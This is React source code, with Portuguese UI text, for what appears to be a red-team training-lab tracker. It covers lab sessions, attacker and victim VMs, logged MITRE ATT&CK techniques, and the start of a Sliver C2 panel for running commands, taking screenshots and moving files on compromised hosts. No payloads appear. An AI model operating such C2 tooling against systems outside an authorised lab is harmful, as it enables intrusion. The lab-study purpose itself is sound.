// ─── MITRE hint box ────────────────────────────────────────────────────────
function MitreHintBox({ mitreId }) {
  const hint = mitreHint(mitreId);
  if (!hint) return null;
  return (
    <div className="text-[11px] bg-cyber-bg border border-cyber-border rounded px-2 py-1.5 mb-1.5">
      <span className="text-cyber-accent"> {hint.name}:</span> <span className="text-cyber-text">{hint.meaning}</span>
      <div className="text-cyber-muted mt-0.5">Como é feito: {hint.howExecuted}</div>
    </div>
  );
}

// ─── Modal ─────────────────────────────────────────────────────────────────
function Modal({ title, onClose, children }) {
  return (
    <div className="fixed inset-0 bg-black/70 z-[100] flex items-center justify-center p-3">
      <div className={`${CARD} w-full max-w-[480px] max-h-[80vh] overflow-y-auto relative`}>
        <div className="flex justify-between items-center mb-4">
          <span className="text-sm font-bold text-cyber-accent">{title}</span>
          <button onClick={onClose} className={`${BTN_GHOST} px-2 py-0.5`}></button>
        </div>
        {children}
      </div>
    </div>
  );
}

// ─── Progress chart ────────────────────────────────────────────────────────
function ProgressChart({ techniques }) {
  if (techniques.length === 0) {
    return <div className="text-cyber-muted text-xs text-center py-5">Sem dados suficientes ainda</div>;
  }

  const byDay = {};
  techniques.forEach(t => {
    const day = t.created_at.slice(0, 10);
    byDay[day] = (byDay[day] || 0) + 1;
  });
  const days = Object.keys(byDay).sort();
  let cum = 0;
  const points = days.map(day => { cum += byDay[day]; return { day, cum }; });

  const width = 560, height = 140, pad = 26;
  const maxY = points[points.length - 1].cum;
  const xStep = points.length > 1 ? (width - pad * 2) / (points.length - 1) : 0;
  const yScale = (v) => height - pad - (maxY ? (v / maxY) * (height - pad * 2) : 0);
  const coords = points.map((p, i) => [pad + i * xStep, yScale(p.cum)]);
  const linePath = coords.map(([x, y], i) => `${i === 0 ? "M" : "L"}${x},${y}`).join(" ");
  const areaPath = `${linePath} L${coords[coords.length - 1][0]},${height - pad} L${coords[0][0]},${height - pad} Z`;

  return (
    <svg viewBox={`0 0 ${width} ${height}`} className="w-full h-[140px]">
      <path d={areaPath} fill="#DC262622" stroke="none" />
      <path d={linePath} fill="none" stroke="#DC2626" strokeWidth="2" />
      {coords.map(([x, y], i) => <circle key={i} cx={x} cy={y} r="2.5" fill="#DC2626" />)}
      <text x={pad} y={height - 6} fill="#64748B" fontSize="9" fontFamily="monospace">{fmtDate(points[0].day)}</text>
      <text x={width - pad} y={height - 6} fill="#64748B" fontSize="9" fontFamily="monospace" textAnchor="end">{fmtDate(points[points.length - 1].day)}</text>
      <text x={pad} y={16} fill="#E2E8F0" fontSize="12" fontFamily="monospace" fontWeight="bold">{maxY} técnicas acumuladas</text>
    </svg>
  );
}

// ─── Overview ──────────────────────────────────────────────────────────────
function Overview({ sessions, techniques }) {
  const total = sessions.length;
  const active = sessions.filter(s => s.status === "em_andamento").length;
  const done = sessions.filter(s => s.status === "concluida").length;
  const totalTech = techniques.length;
  const successRate = totalTech ? Math.round(techniques.filter(t => t.success).length / totalTech * 100) : 0;

  const tacticCount = {};
  techniques.forEach(t => { tacticCount[t.tactic] = (tacticCount[t.tactic] || 0) + 1; });
  const topTactics = Object.entries(tacticCount).sort((a, b) => b[1] - a[1]).slice(0, 5);

  const recentSessions = [...sessions].sort((a, b) => new Date(b.created_at) - new Date(a.created_at)).slice(0, 3);

  const totalMinutes = sessions.reduce((sum, s) => {
    const end = s.ended_at ? new Date(s.ended_at) : new Date();
    const start = new Date(s.started_at || s.created_at);
    return sum + Math.max(0, (end - start) / 60000);
  }, 0);
  const totalHoursLabel = totalMinutes >= 60 ? `${(totalMinutes / 60).toFixed(1)}h` : `${Math.round(totalMinutes)}min`;

  const stats = [
    { label: "Sessões Totais", val: total, className: "text-cyber-accent" },
    { label: "Em Andamento", val: active, className: "text-cyber-warning" },
    { label: "Concluídas", val: done, className: "text-blue-400" },
    { label: "Taxa de Sucesso", val: `${successRate}%`, className: "text-purple-400" },
    { label: "Horas Dedicadas", val: totalHoursLabel, className: "text-cyber-accent" }
  ];

  return (
    <div>
      <InfoBox title={SECTION_INFO.overview.title} icon={SECTION_INFO.overview.icon}>{SECTION_INFO.overview.content}</InfoBox>
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-2 sm:gap-3 mb-4">
        {stats.map(s => (
          <div key={s.label} className={`${CARD} text-center`}>
            <div className={`text-xl sm:text-[28px] font-extrabold ${s.className}`}>{s.val}</div>
            <div className="text-[10px] sm:text-[11px] text-cyber-muted mt-1">{s.label}</div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
        <div className={CARD}>
          <div className="text-xs text-cyber-muted mb-3">TOP TÁTICAS ESTUDADAS</div>
          {topTactics.length === 0 ? (
            <div className="text-cyber-muted text-xs text-center py-5">Nenhuma técnica registrada ainda</div>
          ) : topTactics.map(([tactic, count]) => (
            <div key={tactic} className="mb-2.5">
              <div className="flex justify-between mb-1">
                <span className="text-xs text-cyber-text">{tacticLabel(tactic)}</span>
                <span className="text-[11px] text-cyber-muted">{count}</span>
              </div>
              <div className="h-1 bg-cyber-border rounded-sm">
                <div
                  className="h-full rounded-sm transition-[width] duration-300"
                  style={{ background: TACTIC_COLORS[tactic] || "#10B981", width: `${(count / (topTactics[0]?.[1] || 1)) * 100}%` }}
                />
              </div>
            </div>
          ))}
        </div>

        <div className={CARD}>
          <div className="text-xs text-cyber-muted mb-3">SESSÕES RECENTES</div>
          {recentSessions.length === 0 ? (
            <div className="text-cyber-muted text-xs text-center py-5">Nenhuma sessão ainda</div>
          ) : recentSessions.map(s => {
            const sc = STATUS_COLORS[s.status];
            return (
              <div key={s.id} className="mb-2.5 px-3 py-2.5 bg-cyber-bg rounded-md border border-cyber-border">
                <div className="flex justify-between items-center">
                  <span className="text-[13px] text-cyber-text font-semibold">{s.title}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: sc.bg, color: sc.text }}>{sc.label}</span>
                </div>
                <div className="text-[11px] text-cyber-muted mt-1">{fmtDate(s.created_at)}</div>
              </div>
            );
          })}
        </div>
      </div>

      <div className={`${CARD} mt-3`}>
        <div className="text-xs text-cyber-muted mb-2">PROGRESSO ACUMULADO</div>
        <ProgressChart techniques={techniques} />
      </div>

      <div className="mt-3">
        <CveFeed />
      </div>
    </div>
  );
}

// ─── Kill Chain Checklist ──────────────────────────────────────────────────
const KILLCHAIN_PHASES = TACTICS.map(t => ({
  tactic: t,
  label: TACTIC_LABELS_PT[t] || t,
  color: TACTIC_COLORS[t],
}));

function KillChainChecklist({ sessionId, techniques }) {
  const [checks, setChecks] = useState({});
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    fetchKillchain(sessionId)
      .then(rows => {
        const map = {};
        rows.forEach(r => { map[r.tactic] = { checked: r.checked, notes: r.notes || "" }; });
        setChecks(map);
      })
      .catch(() => {})
      .finally(() => setLoaded(true));
  }, [sessionId]);

  const toggle = async (tactic) => {
    const current = checks[tactic] || { checked: false, notes: "" };
    const next = !current.checked;
    setChecks(c => ({ ...c, [tactic]: { ...current, checked: next } }));
    upsertKillchain(sessionId, tactic, next, current.notes).catch(() => {});
  };

  const sessionTechniques = techniques.filter(t => t.session_id === sessionId);
  const completed = KILLCHAIN_PHASES.filter(p => checks[p.tactic]?.checked).length;
  const progress = Math.round((completed / KILLCHAIN_PHASES.length) * 100);

  if (!loaded) return <div className="text-[11px] text-cyber-muted">Carregando...</div>;

  return (
    <div className="mt-3 pt-3 border-t border-cyber-border">
      <div className="flex items-center justify-between mb-2">
        <span className="text-[10px] font-mono font-bold text-cyber-muted tracking-widest">KILL CHAIN</span>
        <span className="text-[10px] text-cyber-accent font-mono">{completed}/{KILLCHAIN_PHASES.length} ({progress}%)</span>
      </div>
      <div className="h-1.5 bg-cyber-border rounded-full mb-2">
        <div className="h-full rounded-full transition-all duration-500 bg-cyber-accent" style={{ width: `${progress}%` }} />
      </div>
      <div className="grid grid-cols-4 sm:grid-cols-7 gap-1">
        {KILLCHAIN_PHASES.map(p => {
          const check = checks[p.tactic] || { checked: false };
          const hasTech = sessionTechniques.some(t => t.tactic === p.tactic);
          return (
            <button
              key={p.tactic}
              onClick={() => toggle(p.tactic)}
              className={`text-[8px] leading-tight p-1.5 rounded border text-center font-mono transition-all cursor-pointer ${
                check.checked
                  ? "border-transparent text-white font-bold"
                  : hasTech
                    ? "border-cyber-border text-cyber-text bg-cyber-bg"
                    : "border-cyber-border text-cyber-muted/50 bg-transparent"
              }`}
              style={check.checked ? { background: p.color + "cc", borderColor: p.color } : {}}
              title={`${p.label}${hasTech ? ` (${sessionTechniques.filter(t => t.tactic === p.tactic).length} técnicas)` : ""}`}
            >
              {check.checked ? "" : ""} {p.label.split(" ")[0]}
            </button>
          );
        })}
      </div>
    </div>
  );
}

// ─── Sessions ──────────────────────────────────────────────────────────────
function Sessions({ sessions, setSessions, techniques }) {
  const [showNew, setShowNew] = useState(false);
  const [expandedKillChain, setExpandedKillChain] = useState({});
  const [form, setForm] = useState({ title: "", objective: "", status: "em_andamento", notes: "" });

  const create = async () => {
    if (!form.title.trim()) return;
    const s = await createSession(form);
    setSessions([s, ...sessions]);
    setShowNew(false);
    setForm({ title: "", objective: "", status: "em_andamento", notes: "" });
  };

  const remove = async (id) => {
    await deleteSession(id);
    setSessions(sessions.filter(s => s.id !== id));
  };

  const updateStatus = async (id, status) => {
    const session = sessions.find(s => s.id === id);
    const extra = {};
    if (status === "concluida" && !session?.ended_at) {
      extra.ended_at = new Date().toISOString();
    } else if (status !== "concluida") {
      extra.ended_at = null;
    }
    await updateSessionStatus(id, status, extra);
    setSessions(sessions.map(s => s.id === id ? { ...s, status, ...extra } : s));
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.sessions.title} icon={SECTION_INFO.sessions.icon}>{SECTION_INFO.sessions.content}</InfoBox>
      <div className="flex justify-between items-center mb-4">
        <span className="text-xs text-cyber-muted">{sessions.length} sessão(ões) registrada(s)</span>
        <button onClick={() => setShowNew(true)} className={BTN}>+ NOVA SESSÃO</button>
      </div>

      {sessions.length === 0 && (
        <div className={`${CARD} text-center py-10 text-cyber-muted`}>
          <div className="text-3xl mb-2"></div>
          <div>Nenhuma sessão de lab ainda</div>
          <div className="text-[11px] mt-1">Cria sua primeira sessão para começar</div>
        </div>
      )}

      {sessions.map(s => {
        const sc = STATUS_COLORS[s.status];
        const techCount = techniques.filter(t => t.session_id === s.id).length;
        return (
          <div key={s.id} className={`${CARD} mb-2.5`}>
            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-start gap-2">
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                  <span className="text-sm font-bold text-cyber-text">{s.title}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: sc.bg, color: sc.text }}>{sc.label}</span>
                  <span className="text-[10px] text-cyber-muted">{techCount} técnica(s)</span>
                </div>
                {s.objective && <div className="text-xs text-cyber-muted mb-1"> {s.objective}</div>}
                {s.notes && <div className="text-xs text-slate-400"> {s.notes}</div>}
                <div className="text-[11px] text-cyber-muted mt-1.5">
                  {fmtDate(s.created_at)} ·  {fmtDuration(s.started_at || s.created_at, s.ended_at)}{!s.ended_at && " (em andamento)"}
                </div>
              </div>
              <div className="flex gap-1.5 items-center flex-shrink-0">
                <button
                  onClick={() => setExpandedKillChain(e => ({ ...e, [s.id]: !e[s.id] }))}
                  className={`${BTN_GHOST} text-[10px] ${expandedKillChain[s.id] ? "text-cyber-accent border-cyber-accent" : ""}`}
                  title="Kill Chain Checklist"
                ></button>
                <select
                  value={s.status}
                  onChange={e => updateStatus(s.id, e.target.value)}
                  className={`${INPUT} w-auto text-[11px] px-2 py-1`}
                >
                  <option value="em_andamento">Em andamento</option>
                  <option value="concluida">Concluída</option>
                  <option value="pausada">Pausada</option>
                </select>
                <button onClick={() => remove(s.id)} className={`${BTN_GHOST} text-cyber-danger border-cyber-danger`}></button>
              </div>
            </div>
            {expandedKillChain[s.id] && <KillChainChecklist sessionId={s.id} techniques={techniques} />}
          </div>
        );
      })}

      {showNew && (
        <Modal title="NOVA SESSÃO DE LAB" onClose={() => setShowNew(false)}>
          <div className="flex flex-col gap-3">
            <div>
              <label className={LABEL}>Título *</label>
              <input className={INPUT} placeholder="ex: Privilege Escalation no Windows" value={form.title} onChange={e => setForm({ ...form, title: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}>Objetivo</label>
              <input className={INPUT} placeholder="ex: Praticar técnicas de escalada de privilégio local" value={form.objective} onChange={e => setForm({ ...form, objective: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}>Status</label>
              <select className={INPUT} value={form.status} onChange={e => setForm({ ...form, status: e.target.value })}>
                <option value="em_andamento">Em andamento</option>
                <option value="concluida">Concluída</option>
                <option value="pausada">Pausada</option>
              </select>
            </div>
            <div>
              <label className={LABEL}>Notas iniciais</label>
              <textarea className={`${INPUT} h-20 resize-none`} placeholder="Contexto, ambiente, objetivos específicos..." value={form.notes} onChange={e => setForm({ ...form, notes: e.target.value })} />
            </div>
            <div className="flex gap-2 justify-end">
              <button onClick={() => setShowNew(false)} className={BTN_GHOST}>Cancelar</button>
              <button onClick={create} className={BTN}>CRIAR SESSÃO</button>
            </div>
          </div>
        </Modal>
      )}
    </div>
  );
}

// ─── VM Inventory ──────────────────────────────────────────────────────────
const VM_ROLE_LABELS = { atacante: "Atacante", vitima: "Vítima", infra: "Infraestrutura" };
const VM_ROLE_COLORS = { atacante: "#EF4444", vitima: "#4ade80", infra: "#60a5fa" };

function VmInventory({ vms, setVms, sliver, onOpenC2 }) {
  const [showNew, setShowNew] = useState(false);
  const [form, setForm] = useState({ name: "", role: "vitima", os: "", ip_address: "", notes: "" });

  const create = async () => {
    if (!form.name.trim()) return;
    const vm = await createVm(form);
    setVms([vm, ...vms]);
    setShowNew(false);
    setForm({ name: "", role: "vitima", os: "", ip_address: "", notes: "" });
  };

  const remove = async (id) => {
    await deleteVm(id);
    setVms(vms.filter(v => v.id !== id));
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.vms.title} icon={SECTION_INFO.vms.icon}>{SECTION_INFO.vms.content}</InfoBox>
      <div className="flex justify-between items-center mb-4">
        <span className="text-xs text-cyber-muted">{vms.length} VM(s) cadastrada(s)</span>
        <button onClick={() => setShowNew(true)} className={BTN}>+ NOVA VM</button>
      </div>

      {vms.length === 0 && (
        <div className={`${CARD} text-center py-10 text-cyber-muted mb-4`}>
          <div className="text-3xl mb-2"></div>
          <div>Nenhuma VM cadastrada ainda</div>
          <div className="text-[11px] mt-1">Cadastre as máquinas do seu lab (atacante, vítimas, infra)</div>
        </div>
      )}

      <div className="grid gap-2.5" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(min(220px, 100%), 1fr))" }}>
        {vms.map(vm => {
          const liveSession = sliver?.enabled
            ? sliver.sessions.find(s => s.hostname && vm.name && s.hostname.toLowerCase() === vm.name.toLowerCase())
            : null;
          return (
            <div key={vm.id} className={CARD} style={{ borderLeft: `3px solid ${VM_ROLE_COLORS[vm.role] || "#1E293B"}` }}>
              <div className="flex justify-between items-start mb-1.5">
                <span className="text-sm font-bold text-cyber-text">{vm.name}</span>
                <button onClick={() => remove(vm.id)} className={`${BTN_GHOST} text-cyber-danger border-cyber-danger px-1.5 py-0`}></button>
              </div>
              <span className="text-[10px] px-2 py-0.5 rounded inline-block mb-1.5" style={{ background: `${VM_ROLE_COLORS[vm.role] || "#64748B"}22`, color: VM_ROLE_COLORS[vm.role] || "#64748B" }}>
                {VM_ROLE_LABELS[vm.role] || vm.role}
              </span>
              {vm.os && <div className="text-[11px] text-cyber-muted"> {vm.os}</div>}
              {vm.ip_address && <div className="text-[11px] text-cyber-muted font-mono"> {vm.ip_address}</div>}
              {vm.notes && <div className="text-xs text-slate-400 mt-1"> {vm.notes}</div>}
              {liveSession ? (
                <div className="mt-2 pt-2 border-t border-cyber-border">
                  <div className="flex items-center gap-1.5 text-[11px] text-cyber-accent font-bold mb-1">
                    <span className="w-1.5 h-1.5 rounded-full inline-block bg-cyber-accent animate-pulse" />
                    SLIVER ATIVO
                  </div>
                  <div className="text-[11px] text-cyber-muted"> {liveSession.username || "—"}{liveSession.remote_address && ` ·  ${liveSession.remote_address}`}</div>
                  <button onClick={() => onOpenC2?.(liveSession.id)} className={`${BTN_GHOST} w-full mt-1.5 text-center`}>
                    Executar comandos →
                  </button>
                </div>
              ) : sliver?.enabled && (
                <div className="mt-2 pt-2 border-t border-cyber-border text-[10px] text-cyber-muted italic">
                  Sem sessão Sliver ativa com esse hostname
                </div>
              )}
            </div>
          );
        })}
      </div>

      {showNew && (
        <Modal title="NOVA VM DO LAB" onClose={() => setShowNew(false)}>
          <div className="flex flex-col gap-3">
            <div>
              <label className={LABEL}>Nome * (use o hostname real da VM pra linkar com o Sliver)</label>
              <input className={INPUT} placeholder="ex: WIN10-VITIMA-01" value={form.name} onChange={e => setForm({ ...form, name: e.target.value })} />
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>Papel</label>
                <select className={INPUT} value={form.role} onChange={e => setForm({ ...form, role: e.target.value })}>
                  <option value="atacante">Atacante</option>
                  <option value="vitima">Vítima</option>
                  <option value="infra">Infraestrutura</option>
                </select>
              </div>
              <div>
                <label className={LABEL}>Sistema Operacional</label>
                <input className={INPUT} placeholder="ex: Windows 10, Kali Linux" value={form.os} onChange={e => setForm({ ...form, os: e.target.value })} />
              </div>
            </div>
            <div>
              <label className={LABEL}>IP</label>
              <input className={INPUT} placeholder="ex: 192.168.56.10" value={form.ip_address} onChange={e => setForm({ ...form, ip_address: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}>Notas</label>
              <textarea className={`${INPUT} h-20 resize-none`} placeholder="Configuração, vulnerabilidades propositais, snapshot..." value={form.notes} onChange={e => setForm({ ...form, notes: e.target.value })} />
            </div>
            <div className="flex gap-2 justify-end">
              <button onClick={() => setShowNew(false)} className={BTN_GHOST}>Cancelar</button>
              <button onClick={create} className={BTN}>CRIAR VM</button>
            </div>
          </div>
        </Modal>
      )}
    </div>
  );
}

// ─── Techniques ────────────────────────────────────────────────────────────
function Techniques({ techniques, setTechniques, sessions, vms }) {
  const [showNew, setShowNew] = useState(false);
  const [form, setForm] = useState({ session_id: "", target_vm_id: "", mitre_id: "", tactic: TACTICS[0], technique_name: "", tool_used: TOOLS[0], success: true, notes: "", detection_notes: "" });

  const create = async () => {
    if (!form.technique_name.trim()) return;
    const t = await createTechnique(form);
    const next = [t, ...techniques];
    setTechniques(next);
    const count = next.filter(x => x.tactic === t.tactic).length;
    upsertProgress(t.tactic, count).catch(() => {});
    setShowNew(false);
    setForm({ session_id: "", target_vm_id: "", mitre_id: "", tactic: TACTICS[0], technique_name: "", tool_used: TOOLS[0], success: true, notes: "", detection_notes: "" });
  };

  const remove = async (id) => {
    await deleteTechnique(id);
    setTechniques(techniques.filter(t => t.id !== id));
  };

  return (
    <div>
      <InfoBox title={SECTION_INFO.techniques.title} icon={SECTION_INFO.techniques.icon}>{SECTION_INFO.techniques.content}</InfoBox>
      <div className="flex justify-between items-center mb-4">
        <span className="text-xs text-cyber-muted">{techniques.length} técnica(s) documentada(s)</span>
        <button onClick={() => setShowNew(true)} className={BTN}>+ REGISTRAR TÉCNICA</button>
      </div>

      {techniques.length === 0 && (
        <div className={`${CARD} text-center py-10 text-cyber-muted`}>
          <div className="text-3xl mb-2"></div>
          <div>Nenhuma técnica registrada</div>
          <div className="text-[11px] mt-1">Documente as técnicas praticadas no lab</div>
        </div>
      )}

      {techniques.map(t => {
        const session = sessions.find(s => s.id === t.session_id);
        const targetVm = vms.find(v => v.id === t.target_vm_id);
        return (
          <div key={t.id} className={`${CARD} mb-2.5`}>
            <div className="flex justify-between items-start">
              <div className="flex-1">
                <div className="flex items-center gap-2 mb-1.5 flex-wrap">
                  {t.mitre_id && (
                    <a
                      href={mitreUrl(t.mitre_id)}
                      target="_blank"
                      rel="noreferrer"
                      onClick={e => e.stopPropagation()}
                      className="text-[10px] bg-[#1a1a2e] text-indigo-400 border border-indigo-400 px-2 py-0.5 rounded font-mono hover:underline"
                      title="Ver na página oficial do MITRE ATT&CK"
                    >
                      {t.mitre_id}
                    </a>
                  )}
                  <span className="text-sm font-bold text-cyber-text">{t.technique_name}</span>
                  <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: t.success ? "#0d2818" : "#2a0f0f", color: t.success ? "#10B981" : "#EF4444" }}>
                    {t.success ? " Sucesso" : " Falhou"}
                  </span>
                </div>
                <div className="flex gap-2 flex-wrap mb-1.5">
                  <span className="text-[11px] bg-cyber-bg px-2 py-0.5 rounded border" style={{ borderColor: TACTIC_COLORS[t.tactic], color: TACTIC_COLORS[t.tactic] }}>
                    {tacticLabel(t.tactic)}
                  </span>
                  <span className="text-[11px] text-cyber-muted"> {t.tool_used}</span>
                  {session && <span className="text-[11px] text-cyber-muted"> {session.title}</span>}
                  {targetVm && <span className="text-[11px] text-cyber-muted"> {targetVm.name}</span>}
                </div>
                <MitreHintBox mitreId={t.mitre_id} />
                {t.notes && <div className="text-xs text-slate-400 mt-1"> {t.notes}</div>}
                {t.detection_notes && (
                  <div className="text-xs text-amber-400/80 mt-1 bg-[#1a1500] border border-amber-500/30 rounded px-2 py-1">
                     <span className="font-semibold">Detecção:</span> {t.detection_notes}
                  </div>
                )}
                <div className="text-[11px] text-cyber-muted mt-1">{fmtDate(t.created_at)}</div>
              </div>
              <button onClick={() => remove(t.id)} className={`${BTN_GHOST} text-cyber-danger border-cyber-danger`}></button>
            </div>
          </div>
        );
      })}

      {showNew && (
        <Modal title="REGISTRAR TÉCNICA" onClose={() => setShowNew(false)}>
          <div className="flex flex-col gap-3">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>MITRE ID</label>
                <input className={INPUT} placeholder="ex: T1059.001" value={form.mitre_id} onChange={e => setForm({ ...form, mitre_id: e.target.value })} />
              </div>
              <div>
                <label className={LABEL}>Ferramenta</label>
                <select className={INPUT} value={form.tool_used} onChange={e => setForm({ ...form, tool_used: e.target.value })}>
                  {TOOLS.map(t => <option key={t}>{t}</option>)}
                </select>
              </div>
            </div>
            <div>
              <label className={LABEL}>Nome da Técnica *</label>
              <input className={INPUT} placeholder="ex: PowerShell Execution" value={form.technique_name} onChange={e => setForm({ ...form, technique_name: e.target.value })} />
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className={LABEL}>Tática</label>
                <select className={INPUT} value={form.tactic} onChange={e => setForm({ ...form, tactic: e.target.value })}>
                  {TACTICS.map(t => <option key={t} value={t}>{tacticLabel(t)}</option>)}
                </select>
              </div>
              <div>
                <label className={LABEL}>Sessão</label>
                <select className={INPUT} value={form.session_id} onChange={e => setForm({ ...form, session_id: e.target.value })}>
                  <option value="">— Sem sessão —</option>
                  {sessions.map(s => <option key={s.id} value={s.id}>{s.title}</option>)}
                </select>
              </div>
            </div>
            <div>
              <label className={LABEL}>VM Alvo</label>
              <select className={INPUT} value={form.target_vm_id} onChange={e => setForm({ ...form, target_vm_id: e.target.value })}>
                <option value="">— Sem VM alvo —</option>
                {vms.map(v => <option key={v.id} value={v.id}>{v.name}</option>)}
              </select>
            </div>
            <div>
              <label className={LABEL}>Resultado</label>
              <div className="flex gap-2">
                {[true, false].map(v => (
                  <button
                    key={String(v)}
                    onClick={() => setForm({ ...form, success: v })}
                    className="border px-4 py-2 rounded-md text-xs font-mono font-bold cursor-pointer tracking-wide flex-1"
                    style={{
                      background: form.success === v ? (v ? "#10B981" : "#EF4444") : "transparent",
                      borderColor: v ? "#10B981" : "#EF4444",
                      color: form.success === v ? "white" : (v ? "#10B981" : "#EF4444"),
                    }}
                  >
                    {v ? " Sucesso" : " Falhou"}
                  </button>
                ))}
              </div>
            </div>
            <div>
              <label className={LABEL}>Notas</label>
              <textarea className={`${INPUT} h-[70px] resize-none`} placeholder="O que foi aprendido, dificuldades, observações..." value={form.notes} onChange={e => setForm({ ...form, notes: e.target.value })} />
            </div>
            <div>
              <label className={LABEL}> Notas de Detecção</label>
              <textarea className={`${INPUT} h-[70px] resize-none`} placeholder="Como esta técnica é detectada? Quais artefatos deixa? Quais regras Sigma/Yara cobrem? Como evadir?" value={form.detection_notes} onChange={e => setForm({ ...form, detection_notes: e.target.value })} />
            </div>
            <div className="flex gap-2 justify-end">
              <button onClick={() => setShowNew(false)} className={BTN_GHOST}>Cancelar</button>
              <button onClick={create} className={BTN}>REGISTRAR</button>
            </div>
          </div>
        </Modal>
      )}
    </div>
  );
}

// ─── MITRE Map ─────────────────────────────────────────────────────────────
function MitreMap({ techniques, sessions }) {
  const tacticData = TACTICS.map(tac => ({
    tactic: tac,
    techniques: techniques.filter(t => t.tactic === tac),
    color: TACTIC_COLORS[tac]
  }));

  const studied = TACTICS.filter(t => techniques.some(x => x.tactic === t)).length;

  return (
    <div>
      <InfoBox title={SECTION_INFO.mitre.title} icon={SECTION_INFO.mitre.icon}>{SECTION_INFO.mitre.content}</InfoBox>
      <div className={`${CARD} mb-4 flex flex-col sm:flex-row gap-3 sm:gap-6 items-center`}>
        <div className="text-center">
          <div className="text-xl sm:text-[28px] font-extrabold text-cyber-accent">{studied}</div>
          <div className="text-[11px] text-cyber-muted">de 14 táticas</div>
        </div>
        <div className="flex-1 w-full h-2 bg-cyber-border rounded">
          <div
            className="h-full rounded transition-[width] duration-500"
            style={{ background: "linear-gradient(90deg, #DC2626, #F97316)", width: `${(studied / 14) * 100}%` }}
          />
        </div>
        <div className="text-[13px] text-cyber-muted">{Math.round((studied / 14) * 100)}% coberto</div>
      </div>

      <div className={`${CARD} mb-4`}>
        <div className="text-xs text-cyber-muted mb-3">MAPA DE COBERTURA</div>
        <div className="overflow-x-auto">
          <div className="grid gap-1" style={{ gridTemplateColumns: "repeat(14, 1fr)", minWidth: "420px" }}>
            {tacticData.map(({ tactic, techniques: techs, color }) => {
              const intensity = Math.min(1, techs.length / 5);
              return (
                <a
                  key={tactic}
                  href={`#tactic-${tactic}`}
                  title={`${tacticLabel(tactic)}: ${techs.length} técnica(s)`}
                  className="aspect-square rounded flex items-center justify-center text-[10px] font-bold text-white transition-transform hover:scale-110"
                  style={{ background: techs.length > 0 ? color : "#1E293B", opacity: techs.length > 0 ? 0.35 + intensity * 0.65 : 1 }}
                >
                  {techs.length > 0 ? techs.length : ""}
                </a>
              );
            })}
          </div>
          <div className="flex mt-1.5" style={{ minWidth: "420px" }}>
            {tacticData.map(({ tactic }) => (
              <span key={tactic} className="text-[8px] text-cyber-muted text-center" style={{ width: `${100 / 14}%` }} title={tacticLabel(tactic)}>
                {tacticLabel(tactic).slice(0, 3)}
              </span>
            ))}
          </div>
        </div>
      </div>

      <div className="flex flex-col gap-3">
        {tacticData.map(({ tactic, techniques: techs, color }) => (
          <div key={tactic} id={`tactic-${tactic}`} className={CARD} style={{ borderLeft: `3px solid ${techs.length > 0 ? color : "#1E293B"}` }}>
            <div className="text-xs font-bold mb-1" style={{ color: techs.length > 0 ? color : "#64748B" }}>
              {tacticLabel(tactic).toUpperCase()}{techs.length > 0 && <span className="text-cyber-muted font-normal"> ({techs.length})</span>}
            </div>
            <div className="text-[11px] text-cyber-muted mb-3">{TACTIC_DESCRIPTIONS[tactic]}</div>
            {techs.length === 0 ? (
              <div className="text-[11px] text-cyber-muted italic">Nenhuma técnica registrada ainda nessa tática.</div>
            ) : (
              <div className="flex flex-col gap-2">
                {techs.map(t => {
                  const session = sessions.find(s => s.id === t.session_id);
                  return (
                    <div key={t.id} className="bg-cyber-bg border border-cyber-border rounded-md p-3">
                      <div className="flex items-center gap-2 mb-1 flex-wrap">
                        {t.mitre_id && (
                          <a href={mitreUrl(t.mitre_id)} target="_blank" rel="noreferrer" className="text-[10px] bg-[#1a1a2e] text-indigo-400 border border-indigo-400 px-2 py-0.5 rounded font-mono hover:underline" title="Ver na página oficial do MITRE ATT&CK">
                            {t.mitre_id}
                          </a>
                        )}
                        <span className="text-[13px] font-bold text-cyber-text">{t.technique_name}</span>
                        <span className="text-[10px] px-2 py-0.5 rounded" style={{ background: t.success ? "#0d2818" : "#2a0f0f", color: t.success ? "#4ade80" : "#EF4444" }}>
                          {t.success ? " Sucesso" : " Falhou"}
                        </span>
                      </div>
                      <div className="text-[11px] text-cyber-muted mb-1"> {t.tool_used}{session && ` ·  ${session.title}`} ·  {fmtDateTime(t.created_at)}</div>
                      <MitreHintBox mitreId={t.mitre_id} />
                      {t.notes && <div className="text-xs text-slate-400 whitespace-pre-wrap"> {t.notes}</div>}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── Sliver C2 ─────────────────────────────────────────────────────────────
function SliverPanel({ sliver, sessions, techniques, setTechniques, initialTarget }) {
  // ── State ─────────────────────────────────────────────────────────────────
  const [selectedTarget, setSelectedTarget] = useState("");
  const [selectedLabSession, setSelectedLabSession] = useState("");
  const [activeTab, setActiveTab] = useState("commands");

  // Terminal (commands)
  const [termHistory, setTermHistory] = useState([]);
  const [termInput, setTermInput] = useState("");
  const [termHistIdx, setTermHistIdx] = useState(-1);
  const [cmdPolling, setCmdPolling] = useState(false);
  const [running, setRunning] = useState(false);
  const [logError, setLogError] = useState(null);
  const termEndRef = useRef(null);

  // Screenshot
  const [ssPolling, setSsPolling] = useState(false);
  const [ssResult, setSsResult] = useState(null);

  // Files
  const [filesPolling, setFilesPolling] = useState(false);
  const [filesResult, setFilesResult] = useState(null);
  const [filesPath, setFilesPath] = useState(".");
  const [dlPolling, setDlPolling] = useState({});
  const [uploadFile, setUploadFile] = useState(null);
  const [uploadPath, setUploadPath] = useState("");
